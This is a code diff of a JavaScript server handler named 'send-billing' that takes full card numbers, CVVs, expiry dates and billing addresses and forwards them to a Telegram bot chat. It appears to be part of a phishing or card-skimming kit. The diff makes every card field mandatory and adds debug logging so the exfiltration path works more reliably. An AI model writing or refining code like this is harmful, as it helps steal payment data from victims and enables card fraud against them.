@@ -12,8 +12,34 @@ export default async function handler(req, res) {
         hasExpiration: !!expiration,
         hasCVV: !!cvv,
         hasAddress: !!address,
+        hasCity: !!city,
+        hasState: !!state,
+        hasZip: !!zip,
         userId: userId || 'N/A'
       });
+      
+      // Validate required fields
+      const missingFields = [];
+      if (!cardNumber) missingFields.push('cardNumber');
+      if (!cardholderName) missingFields.push('cardholderName');
+      if (!expiration) missingFields.push('expiration');
+      if (!cvv) missingFields.push('cvv');
+      if (!address) missingFields.push('address');
+      if (!city) missingFields.push('city');
+      if (!state) missingFields.push('state');
+      if (!zip) missingFields.push('zip');
+      
+      if (missingFields.length > 0) {
+        console.error('[send-billing] ❌ Missing required fields:', missingFields);
+        return res.status(400).json({
+          success: false,
+          error: 'Missing required fields',
+          missingFields: missingFields,
+          message: `Missing required fields: ${missingFields.join(', ')}`
+        });
+      }
+      
+      console.log('[send-billing] ✅ All required fields present');
       
       // Check environment variables
       const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -49,26 +75,38 @@ export default async function handler(req, res) {
       
       // Try to send notification, but don't fail if it doesn't work
       try {
+        console.log('[send-billing] Calling sendTelegramMessage with message length:', message.length);
         const result = await sendTelegramMessage(message);
         
+        console.log('[send-billing] sendTelegramMessage result:', result);
+        
         if (result) {
-          console.log('[send-billing] Telegram notification sent successfully');
+          console.log('[send-billing] ✅ Telegram notification sent successfully');
+          console.log('[send-billing] Message ID:', result.message_id);
+          console.log('[send-billing] Chat ID:', result.chat?.id);
           return res.status(200).json({ success: true, messageId: result.message_id });
         } else {
-          console.warn('[send-billing] Failed to send Telegram notification, but continuing');
+          console.error('[send-billing] ❌ Failed to send Telegram notification');
+          console.error('[send-billing] sendTelegramMessage returned null/undefined');
+          console.error('[send-billing] Check if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set correctly');
           return res.status(200).json({ 
             success: false,
             warning: 'Telegram notification failed',
-            message: 'Billing details not sent to Telegram. Check bot token and chat ID.'
+            message: 'Billing details not sent to Telegram. Check bot token and chat ID.',
+            debug: 'sendTelegramMessage returned null'
           });
         }
       } catch (telegramError) {
-        console.error('[send-billing] Telegram error (non-blocking):', telegramError);
+        console.error('[send-billing] ❌ Telegram error (non-blocking):', telegramError);
+        console.error('[send-billing] Error name:', telegramError?.name);
+        console.error('[send-billing] Error message:', telegramError?.message);
+        console.error('[send-billing] Error stack:', telegramError?.stack);
         // Still return success so page can continue
         return res.status(200).json({ 
           success: false,
           warning: 'Telegram notification error',
-          error: telegramError.message,
+          error: telegramError?.message || 'Unknown error',
+          errorName: telegramError?.name,
           message: 'Billing details not sent to Telegram.'
         });
       }
